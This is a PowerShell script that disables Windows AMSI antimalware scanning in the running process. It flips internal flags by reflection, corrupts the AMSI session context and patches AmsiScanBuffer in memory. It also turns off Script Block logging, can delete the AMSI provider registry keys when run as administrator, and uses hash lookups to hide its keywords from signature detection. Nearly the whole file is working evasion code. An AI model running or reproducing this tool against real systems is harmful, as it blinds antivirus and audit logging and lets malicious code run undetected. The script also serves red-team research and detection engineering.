#requires -version 5

<#
.SYNOPSIS
    
Attempts  to disable AMSI within current process using well-known techniques laid out in an unsignatured way.

Author: Mariusz B. (@mgeeky)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Tries to evade AMSI by leveraging couple of publicly documented techniqus, but in 
an approach to avoid signatured or otherwise considered harmful keywords. 

Notice: These techniques only disable AMSI within current process context. Tricks implemented 
are not system-wide and not permament.

Using a hash-lookup approach when determining prohibited symbol names, we are able
to avoid relying on blacklisted values and having them hardcoded within the script. 
This implementation iterates over all of the assemblies, their exposed types, methods and 
fields in order to find those that are required but by their computed hash-value rather than
direct name. Since hash-value computation algorithm was open-sources and is simple to 
manipulate, the attacker becomes able to customize hash-lookup scheme the way he likes.

A simplest approach to alter return values coming out of Get-Hash would be to change the
initial value of $val variable. 

The script comes up with several techniques implemented. Triggers them one by one. Should one
return successfully, the script is going to finish it's execution.

The approaches implemented in this script heavily rely on the previous work of:

- Matt Graeber: https://github.com/mattifestation/PSReflect
- Matt Graeber: https://twitter.com/mattifestation/status/735261120487772160
- Avi Gimpel: https://www.cyberark.com/threat-research-blog/amsi-bypXXXass-redux/
- Adam Chester: https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/

.PARAMETER DontDisableBlockLogging

Prevents this script from attempting to disable Script-Block logging feature introduced
in Powershell Ver. 5

.PARAMETER RemoveAmsiProviders

If this script was launched as an Administrator prinicipal, an attempt to remove AMSI Providers
can be made. Such attempt will try to remove registry keys named in a GUID style, located at:
    HKLM\Software\Microsoft\AMSI\ProviXders

It is recommended to firstly backup that registry key by doing something like:
    cmd> reg export HKLM\Software\Microsoft\AMSI\Providers "%TEMP%\AmsiPrXoviders.reg"

.EXAMPLE

PS > "amsiIXnitFailXed"
At line:1 char:1
+ "amsiIXnitFailXed"
+ ~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS > . .\Disable-Amsi.ps1
PS > Disable-Amsi
[+] Disabled Script Block logging.
[+] Success via technique 1.
PS > "amsiIXnitFailXed"
amsiIXnitFailXed

.NOTES 

This script has not yet been thouroughly tested, although it has the code intended to 
work on x86 systems, this code was not validated on them. 

#>

function New-InMemoryModule
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}

function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

########################################################


$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
    # psapi
    (func psapi EnumProcessModulesEx ([Bool]) @(
        [IntPtr],                       # hProcess
        [IntPtr].MakeArrayType(),       # lphModule
        [UInt32],                       # cb
        [UInt32].MakeByRefType(),       # cbNeeded
        [UInt32]                        # dwFilterFlags
    ) -SetLastError),

    (func psapi GetModuleFileNameExW ([UInt32]) @(
        [IntPtr],
        [IntPtr],
        [System.Text.StringBuilder],
        [Int32]
    ) -SetLastError -Charset Unicode),

    # kernel32
    (func kernel32 VirtualProtect ([Bool]) @(
        [IntPtr], 
        [UInt32], 
        [Uint32], 
        [UInt32].MakeByRefType()
    ) -SetLastError)

    (func kernel32 RtlMoveMemory ([Void]) @(
        [IntPtr],                       # Destination
        [IntPtr],                       # Source
        [UInt32]                        # dwSize
    ))
)

$FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32' | Out-Null


########################################################

function Disable-Amsi 
{
    Param(
        [Switch]
        $DontDisableBlockLogging,

        [Switch]
        $RemoveAmsiProviders
    )

    function bitshift 
    {
        param(
            [Parameter(Mandatory,Position=0)]
            [long]$x,

            [Parameter(ParameterSetName='Left')]
            [ValidateRange(0,[int]::MaxValue)]
            [int]$Left,

            [Parameter(ParameterSetName='Right')]
            [ValidateRange(0,[int]::MaxValue)]
            [int]$Right
        )

        $shift = if($PSCmdlet.ParameterSetName -eq 'Left')
        { 
            $Left
        }
        else
        {
            -$Right
        }

        $ret = [math]::Floor($x * [math]::Pow(2,$shift))
        return [System.Convert]::TOUInt32($ret -band ([uint32]::MaxValue))
    }

    #
    # def gethash(x):
    #     val = 5381
    #     x = x.lower()
    #     for a in x:
    #         n = (val << 5) & 0xffffffff
    #         val = val + n + ord(a)
    #     return val
    #

    # C:\Windows\System32\amXsi.dll - 63354690687
    # System.Management.AutoXmation.dll - 65764965518
    # AmsiXCloseSession - 30387720265
    # AmsiXInitialize - 27745586497
    # AmsiXOpenSession - 34471491749
    # AmsiXScanBuffer - 27346550254
    # AmsiXUacInitialize - 33631030458
    # AmsiXUacScan - 19307673869
    # AmsiXUacUninitialize - 32135665149
    # AmsiXUninitialize - 30978397252

    function Get-Hash 
    {
        param(
            [Parameter(Mandatory = $true)]
            [AllowEmptyString()]
            [string]$name
        )
        if ($name.Length -eq 0)
        {
            return 0
        }
    
        $name = $name.ToLower();
        $val = 5381
        for($i = 0; $i -lt $name.Length; $i++)
        {
            $n = bitshift $val -left 5
            $val = ($n + $val) + [byte][char]$name[$i]
        }

        return $val
    }

    function Find-AmsiModule
    {
        # Get-Hash ("C:\WINDOWS\SYSTEM32\amXsi.dll")
        $TargetHash = 63354690687

        $handle = New-Object IntPtr -1
        $cb = 1024
        $cbNeeded = New-Object UInt32
        $modules = New-Object IntPtr[] $cb
        $null = [Win32.psapi]::EnumProcessModulesEx($handle, $modules, $cb * [IntPtr]::Size, [ref] $cbNeeded, 3)

        for($i = 0; $i -lt $cb; $i ++) {
            if ($modules[$i] -eq [IntPtr]::Zero) {
                break;
            }

            $lpFileName = [Activator]::CreateInstance([System.Text.StringBuilder], 256)
            $null = [Win32.psapi]::GetModuleFileNameExW($handle, $modules[$i], $lpFileName, $lpFileName.Capacity)
            if ((Get-Hash($lpFileName)) -eq $TargetHash) {
                return [IntPtr]$modules[$i]
            }
        }

        return $null
    }

    function Get-ProcAddress
    {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $Module,
            [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
        )

        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", 
                $null, [System.Reflection.CallingConventions]::Any, 
                @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Module)
        
        return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Technique1 
    {
        # Using reflection we find init failed non public symbol and flip it to true.
        # The trick here is to avoid use of any prohibited word by refering to them via hash-lookups.
        try
        {
            $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}  # SysXtem.ManaXgement.AutomaXtion.dll
            $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 13944524928}  # AmsiUXtils
            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 27628075080}  # amsiInXitFaXiled
            $foo.SetValue($null, $true)
            return $foo.GetValue($null)
        }
        Catch
        {
            return $false
        }
    }

    function Technique2
    {
        # This one tries to corrupt context of AMSI as created during that inteface's
        # initialization.
        try
        {
            $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}  # SysXtem.ManaXgement.AutomaXtion.dll
            $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 13944524928}  # AmsiUXtils
            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 21195228531}  # amsiSesXsion
            $foo.SetValue($null, $null)

            $bar = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9077)
            $baz = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 18097066420}  # amsiConXtext
            $baz.SetValue($null, $bar)
            
            $xyz = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 27628075080}  # amsiInXitFaXiled
            return $xyz.GetValue($null)
        }
        Catch
        {
            return $false
        }
    }

    function Technique3 ($addr) 
    {
        if([IntPtr]::Size -eq 8)
        {       
            # 64 bit
            # Patching length-check in buffer scanning routine to make it believe it always
            # receives an empty buffer.

            $buf = New-Object byte[] 64
            [System.Runtime.InteropServices.Marshal]::Copy($addr, $buf, 0, 0x24)

            for($i = 0; $i -lt $buf.Length; $i++)
            {
                # mov edi, r8d
                if (($buf[$i+0] -eq 0x41) -and ($buf[$i+1] -eq 0x8b) -and ($buf[$i+2] -eq 0xf8))
                {
                    $oldProtect = New-Object UInt32
                    $nAddr = [IntPtr]::Add($addr, $i)
                    if ([Win32.kernel32]::VirtualProtect($nAddr, [UInt32]3, 0x40, [ref]$oldProtect)) 
                    {
                        $newBuf = New-Object byte[] 3
                        $newBuf[0] = 0x31; 
                        $newBuf[1] = 0xff; 
                        $newBuf[2] = 0x90;

                        $unmanaged = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(5)
                        [System.Runtime.InteropServices.Marshal]::Copy($newBuf, 0, $unmanaged, 3)

                        # Patch with xor edi, edi ; nop
                        try
                        {
                            [Win32.kernel32]::RtlMoveMemory($nAddr, $unmanaged, 3)
                            [Win32.kernel32]::VirtualProtect($nAddr, [UInt32]3, $oldProtect, [ref]$oldProtect)
                            return $true
                        }
                        catch
                        {
                            [Win32.kernel32]::VirtualProtect($nAddr, [UInt32]3, $oldProtect, [ref]$oldProtect)
                        }
                    }
                }
            }
        }
        else
        {
            # 32 bit approach.
            # Here we just patch out the prologue of the same function with simple return 0 
            # sequence.

            $oldProtect = New-Object UInt32
            if ([Win32.kernel32]::VirtualProtect($addr, [UInt32]3, 0x40, [ref]$oldProtect)) 
            {
                 # xor eax, eax; ret
                $newBuf = New-Object byte[] 3
                $newBuf[0] = 0x31; 
                $newBuf[1] = 0xc0; 
                $newBuf[2] = 0xc3;

                $unmanaged = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(5)
                [System.Runtime.InteropServices.Marshal]::Copy($newBuf, 0, $unmanaged, 3)

                try
                {
                    [Win32.kernel32]::RtlMoveMemory($addr, $unmanaged, 3)
                    [Win32.kernel32]::VirtualProtect($addr, [UInt32]3, $oldProtect, [ref]$oldProtect)
                    return $true
                }
                catch
                {
                    [Win32.kernel32]::VirtualProtect($addr, [UInt32]3, $oldProtect, [ref]$oldProtect)
                }
            }
        } 

        return $false
    }

    function Disable-ScriptLogging
    { 
        function ScriptLogging-Technique1
        {
            $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}
            $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 12579468197}
            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 12250760746}
            $out = $foo.GetValue($null)
            $k0 = ""
            foreach ($item in $out){
                if((Get-Hash($item)) -eq 32086076268) { # ScrXiptBloXckLogXging
                    $k0 = $item
                    break
                }
            }
            $foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
            Write-Host "[+] Finished applying technique 1"
            return $k0
        }

        function ScriptLogging-Technique2($k0)
        {
            $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}  # SysXtem.ManaXgement.AutomaXtion.dll
            $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 4572158998} # UXtils
            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 52485150955} # caXchedGrXoupPoXlicySettXings
            if(-not $foo -or $foo -eq $null) {
                $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 56006640029} # s_caXchedGrXoupPoXlicySettXings
            }

            if($foo) {
                $cache = $foo.GetValue($null)
                $k1 = $cache.Keys | ? {(Get-Hash($_.Split('\\')[-1])) -eq 32086076268} # ScrXiptBloXckLogXging
                if($k1 -and $cache[$k1]) {
                    $k2 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 45083803091} # EnabXleScrXiptBloXckLogXging
                    $k3 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 70211596397} # EnabXleScrXiptBloXckInvocXationLogXging
                    if($k2 -and $cache[$k1][$k2]) {
                        $cache[$k1][$k2] = 0
                    }
                    if($k3 -and $cache[$k1][$k3]) {
                        $cache[$k1][$k3] = 0
                    }
                }

                $vl = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
                $vl.Add('Enabl'+'e'+$k0, 0)
                $k01 = $k0 -replace 'kL', 'kInvocationL'
                $vl.Add('Ena'+'ble'+$k01, 0)
                $cache['HKEY_LOCAL_M'+'ACHINE\Software\Policie'+'s\Microsoft\Wind'+'ows\PowerSh'+'ell\'+$k0] = $vl
            }

            Write-Host "[+] Finished applying technique 2"
        }

        $out = ScriptLogging-Technique1
        ScriptLogging-Technique2 $out
        return $true
    }

    function Check-IsAdmin {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    function Remove-AmsiProviders {
        $providers = (Get-ChildItem HKLM:\Software\Microsoft\AMSI\Providers)
        $providers | ForEach-Object {
            Remove-Item -Path $_.Name -Recurse
        }
    }

    function Do-Stuff
    {
        $ver = $PSVersionTable.PSVersion.Major
        if ($ver -lt 5) {
            Write-Host "[-] Powershell environment found running at version: $ver . Required 5+"
            return
        }

        if ($DontDisableBlockLogging -eq $false) {
            if (Disable-ScriptLogging) {
                Write-Host "[+] Disabled Script Block logging."
            }
            else {
                Write-Host "[-] Could not disable Script Block logging."
            }
        }

        if ($RemoveAmsiProviders) {
            if (Check-IsAdmin) {
                Remove-AmsiProviders
            }
            else {
                Write-Host "[-] Script was not launched as Administrator. Cannot remove providers."
            }
        }

        $imageBase = Find-AmsiModule
        if ($imageBase -eq $null) {
            Write-Host "[-] Could not find AMSI module."
            return $null
        }

        $name = [System.AppDomain]::CurrentDomain.GetAssemblies() |
            ForEach-Object { $_.GetTypes() } |
                # TODO: Get rid of these nonpublic, static strings
                ForEach-Object { $_.GetMethods('NonPublic, Public, Static') } |
                    ForEach-Object { $MethodInfo = $_; $_.GetCustomAttributes($false) } |
                        Where-Object {
                            $_.Value -and $MethodInfo.Name -and (((Get-Hash($_.Value)) -eq 12263690201) -and ((Get-Hash($MethodInfo.Name)) -eq 27346550254))
                        } | ForEach-Object { $MethodInfo.Name }

        # TODO: Get rid of GetProcAddress in favor of manual Exports table parsing.
        $addr = Get-ProcAddress $imageBase $name
        
        # We attempt various techniques accordingly to how stable they are.
        if (Technique1) {
            Write-Host "[+] Success via technique 1."
            return
        }

        if (Technique2) {
            Write-Host "[+] Success via technique 2."
            return
        }

        if (Technique3($addr)) {
            Write-Host "[+] Success via technique 3."
            return
        }
    }

    Do-Stuff
}
